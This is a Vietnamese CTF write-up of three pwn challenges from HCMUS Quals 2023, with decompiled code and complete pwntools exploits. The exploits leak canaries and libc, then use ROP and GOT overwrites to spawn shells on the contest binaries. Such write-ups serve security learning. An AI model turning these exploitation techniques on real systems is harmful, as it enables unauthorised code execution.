# Writeup HCMUS Quals 2023

Cuối tuần chill cùng project error với vòng loại giải HCMUS-CTF, và sau đây sẽ là writeup những bài bài mình giải được.
## Python_is_safe
`main.py`
```py
#!/usr/bin/env python3

from ctypes import CDLL, c_buffer
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
buf1 = c_buffer(512)
buf2 = c_buffer(512)
libc.gets(buf1)
if b'HCMUS-CTF' in bytes(buf2):
    print(open('./flag.txt', 'r').read())
```
Nhìn sơ qu chương trình, ta thấy dùng hàm gets cho buf1 -> `BOF`. Chương trình sau đó check xem chuỗi `HCMUS-CTF` có trong buf2 hay không. Mình chỉ cần nhập 512 ký tự `A`và chuỗi `HCMUS-CTF` là có flag:
Flag: `HCMUS-CTF{pYt40n_4rE_s|U|Perrrrrrr_5ecureeeeeeeeeeee}`


## Coin Mining

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  const char *v3; // rax
  int v5; // [rsp+Ch] [rbp-94h] BYREF
  char buf[136]; // [rsp+10h] [rbp-90h] BYREF
  unsigned __int64 v7; // [rsp+98h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  qword_4060 = (__int64)"watching some isekai anime";
  qword_4068 = (__int64)"analysis some chart";
  qword_4070 = (__int64)"find your life meaning";
  qword_4078 = (__int64)"stand here and cry";
  qword_4080 = (__int64)"play some ARAM games";
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  puts("Greet, do you want some coin? ");
  __isoc99_scanf("%d", &v5);
  if ( v5 == 1 )
  {
    puts("Great!");
    printf("Guess what coin I will give you: ");
    read(0, buf, 0x200uLL);
    while ( strcmp("notHMCUS-CTF{a_coin_must_be_here}\n", buf) )
    {
      printf("%s??\n", buf);
      v3 = (const char *)sub_1229();
      printf("Shame on you for haven't gotten it. Maybe try %s\n", v3);
      printf("Try again: ");
      read(0, buf, 0x200uLL);
    }
    puts("Well done! Here is your coin!");
  }
  else
  {
    puts(&byte_2158);
    system("/bin/zsh");
  }
  return 0LL;
}
```
Nhìn vào hàm main, ta thấy có lỗi buffer overflow ở dòng code sau:
```C
read(0, buf, 0x200uLL);
```
Chương trình cấp phát cho biến buf 136 bytes, nhưng lại read tới 512 bytes. Vì vậy ta có thể thực hiện ROP hoặc ret2libc. Nhưng khi checksec thì:
```sh
[*] '/home/lynklee/CTF/HCMUS/pwn/coin_miningg/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```
Chương trình bật cả 4 chế độ bảo vệ, và để có thể chiếm shell, ta cần leak ra được địa chỉ canary cũng như là địa chỉ libc (lí do mình không leak PIE là vì các gadget cần thiết đều đã có sẵn trong libc, chính vì vậy có được libc là đủ). 

Mình leak được libc và canary thông qua offset thứ 15 và 19.
```c
0c:0060│     0x7fffffffdca0 ◂— 0xc2
0d:0068│     0x7fffffffdca8 —▸ 0x7ffff7bf0628 (__exit_funcs_lock) ◂— 0x0
0e:0070│     0x7fffffffdcb0 —▸ 0x7ffff7c109a0 (_dl_fini) ◂— push rbp
0f:0078│     0x7fffffffdcb8 —▸ 0x7ffff7843489 (__cxa_atexit+89) ◂— test rax, rax
10:0080│     0x7fffffffdcc0 ◂— 0xf7e29170
11:0088│     0x7fffffffdcc8 ◂— 0x0
12:0090│     0x7fffffffdcd0 ◂— 0x0
13:0098│     0x7fffffffdcd8 ◂— 0x43785b90b1135d00
14:00a0│ rbp 0x7fffffffdce0 ◂— 0x0
15:00a8│     0x7fffffffdce8 —▸ 0x7ffff7821b97 (__libc_start_main+231) ◂— mov edi, eax
16:00b0│     0x7fffffffdcf0 ◂— 0x1
17:00b8│     0x7fffffffdcf8 —▸ 0x7fffffffddc8 —▸ 0x7fffffffe158 ◂— '/home/lynklee/CTF/HCMUS/pwn/coin_miningg/chall'
18:00c0│     0x7fffffffdd00 ◂— 0x100008000
19:00c8│     0x7fffffffdd08 —▸ 0x55555555528b ◂— endbr64 
1a:00d0│     0x7fffffffdd10 ◂— 0x0
1b:00d8│     0x7fffffffdd18 ◂— 0x7726f80ac803c523
1c:00e0│     0x7fffffffdd20 —▸ 0x555555555140 ◂— endbr64 
1d:00e8│     0x7fffffffdd28 —▸ 0x7fffffffddc0 ◂— 0x1
```
Sau đó thì mình nhập payload để break khỏi vòng while và đến với return address, ta sẽ có được shell.

**Final script**
```py
from pwn import *

e = context.binary = ELF("./chall")
r = e.process()
libc = ELF('./libc.so.6')

#r = remote("coin-mining-8295e6244266c6b3.chall.ctf.blackpinker.com", 443, ssl = True)
gs = """
brva 0x0000000000013c3
brva 0x0000000000013A3
"""

gdb.attach(r, gs)
pause()
r.recv()
r.sendline(b'1')
r.sendafter(b'Guess what coin I will give you: ', b'A' * 104)
libc.address = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\0')) - 0x43489
log.info(f'Libc address: {hex(libc.address)}')
r.sendafter(b'Try again: ', b'A' * 137)
r.recvuntil(b'A' * 137)
canary = u64(r.recv(7).rjust(8, b'\0'))
log.info(f'Canary: {hex(canary)}')
pop_rdi = libc.address + 0x000000000002155f
bin_sh = next(libc.search(b'/bin/sh\x00'))
payload = b'notHMCUS-CTF{a_coin_must_be_here}\n'
payload = payload.ljust(136, b'\x00')
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(pop_rdi + 1)
payload += p64(libc.sym['system'])
r.sendlineafter(b'Try again: ', payload)
r.interactive()
```
```sh
python3 x.py                                                                                                                             ─╯
[*] '/home/lynklee/CTF/HCMUS/pwn/coin_miningg/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
[+] Starting local process '/home/lynklee/CTF/HCMUS/pwn/coin_miningg/chall': pid 2636
[*] '/home/lynklee/CTF/HCMUS/pwn/coin_miningg/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] running in new terminal: ['/usr/bin/gdb', '-q', '/home/lynklee/CTF/HCMUS/pwn/coin_miningg/chall', '2636', '-x', '/tmp/pwngycspo0f.gdb']
[+] Waiting for debugger: Done
[*] Paused (press any to continue)
[*] Libc address: 0x7f080ba00000
[*] Canary: 0x428f87296d0c9700
[*] Switching to interactive mode
Well done! Here is your coin!
$ id
uid=1000(lynklee) gid=1000(lynklee) groups=1000(lynklee),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),119(lpadmin),131(sambashare)
$ whoami
lynklee
```

## String chan
Bài này khá lằng nhằng đối với mình vì nó được viết bằng C++, nhưng không sao vì cuối cùng `shell is always enough`:
- Basic check:
```sh
checksec chall                                                                      ─╯
[*] '/home/lynklee/string_chan/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Đưa vào IDA:
```C++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rbx
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // rax
  __int64 v15; // rbx
  __int64 v16; // rax
  __int64 v17; // rax
  __int64 v18; // rax
  int v19; // ebx
  int v21; // [rsp+Ch] [rbp-64h] BYREF
  char v22[72]; // [rsp+10h] [rbp-60h] BYREF
  unsigned __int64 v23; // [rsp+58h] [rbp-18h]

  v23 = __readfsqword(0x28u);
  Test::Test((Test *)v22);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "1. set c_str");
  v4 = std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  v5 = std::operator<<<std::char_traits<char>>(v4, "2. get c_str");
  v6 = std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
  v7 = std::operator<<<std::char_traits<char>>(v6, "3. set str");
  v8 = std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
  v9 = std::operator<<<std::char_traits<char>>(v8, "4. get str");
  std::ostream::operator<<(v9, &std::endl<char,std::char_traits<char>>);
  while ( (unsigned __int8)std::ios::good(&unk_404230) )
  {
    v21 = 0;
    std::operator<<<std::char_traits<char>>(&std::cout, "choice: ");
    std::istream::operator>>(&std::cin, &v21);
    if ( v21 == 4 )
    {
      v15 = std::operator<<<std::char_traits<char>>(&std::cout, "str: ");
      v16 = Test::str[abi:cxx11]((__int64)v22);
      v17 = std::operator<<<char>(v15, v16);
      std::ostream::operator<<(v17, &std::endl<char,std::char_traits<char>>);
    }
    else
    {
      if ( v21 > 4 )
        goto LABEL_13;
      switch ( v21 )
      {
        case 3:
          std::operator<<<std::char_traits<char>>(&std::cout, "str: ");
          v14 = Test::str[abi:cxx11]((__int64)v22);
          std::operator>><char>(&std::cin, v14);
          break;
        case 1:
          std::operator<<<std::char_traits<char>>(&std::cout, "c_str: ");
          v10 = Test::c_str((Test *)v22);
          std::operator>><char,std::char_traits<char>>(&std::cin, v10);
          break;
        case 2:
          v11 = std::operator<<<std::char_traits<char>>(&std::cout, "c_str: ");
          v12 = Test::c_str((Test *)v22);
          v13 = std::operator<<<std::char_traits<char>>(v11, v12);
          std::ostream::operator<<(v13, &std::endl<char,std::char_traits<char>>);
          break;
        default:
LABEL_13:
          v18 = std::operator<<<std::char_traits<char>>(&std::cout, "bye!");
          std::ostream::operator<<(v18, &std::endl<char,std::char_traits<char>>);
          v19 = 0;
          goto LABEL_15;
      }
    }
  }
  v19 = 1;
LABEL_15:
  Test::~Test((Test *)v22);
  return v19;
}
```
Bug nằm ở đoạn code dưới đây:
```C
          std::operator<<<std::char_traits<char>>(&std::cout, "c_str: ");
          v10 = Test::c_str((Test *)v22);
          std::operator>><char,std::char_traits<char>>(&std::cin, v10);
          break;
```
`cin` không check size input mình nhập vào, chính vì vậy có thể gây ra lỗi `Buffer Overflow`. Với BOF, mình có thể overwrite GOT hoặc return address. 
Mục tiêu của chúng ta sẽ là gọi đến hàm này:
```C
int __fastcall Test::call_me(Test *this)
{
  return system("/bin/sh");
}
```
Mình check behavior của string và nhận ra 1 điều, 8 bytes đầu tiên sẽ là pointer to string được ghi vào, 8 bytes tiếp theo sẽ là size của string, và 8 bytes cuối sẽ là kích thước được cấp phát cho string .Vậy nếu như mình set pointer của string là 1 hàm trong bảng GOT và mình input C++ string thì chuyện gì sẽ xảy ra. Yup, mình sẽ overwrite GOT bằng một function bất kì, cụ thể là`call_me`

Có một số điều mình thắc mắc, không biết là tại sao khi mình ghi đè vào got của `__stack_chk_fail_` đến hàm callme thì lên remote bị EOF. Có lẽ do `stack misalignment` trên remote server. Vậy nên mình quyết định không overwrite GOT bằng callme, mà thay vào đó sẽ overwrite vào return address bằng hàm callme, và bypass canary bằng cách ghi đè vào GOT của `__stack_chk_fail` bằng lệnh ret. Sau đó thoát loop và sẽ có shell.

**Final Script:**
```py
from pwn import *

e = context.binary = ELF('./chall')
#r = e.process()
gs = """
b*main+510
"""
#gdb.attach(r, gs)
#pause()
r = remote("string-chan-b4fceb7dfb16f556.chall.ctf.blackpinker.com", 443, ssl = True)
payload = b'A' * 0x20 + p64(e.got['__stack_chk_fail']) + p64(8) * 2 #pointer, size, allocate capacity respectively
#pause()
r.sendlineafter(b'choice: ',b'1')
#pause()
sleep(2.5)
r.sendline(payload)
#pause()
sleep(2.5)
r.sendlineafter(b'choice: ',b'3')
sleep(2.5)
#pause()
r.sendlineafter(b'str: ', p64(0x000000000040101a)) #ret
sleep(1)
payload = b'\x00' * 0x68 #padding to saved rip
payload += p64(0x00000000004016de) # call_me
r.sendline(b'1')
sleep(2.5)
r.sendline(payload)
sleep(1)
r.sendline(b'100') # break loop
r.interactive()
```
```sh
python3 x.py                                                                        ─╯
[*] '/home/lynklee/string_chan/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/lynklee/string_chan/chall': pid 2460
[*] Switching to interactive mode
choice: c_str: choice: bye!
$ id
uid=1000(lynklee) gid=1000(lynklee) groups=1000(lynklee),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)
$ whoami
lynklee
```
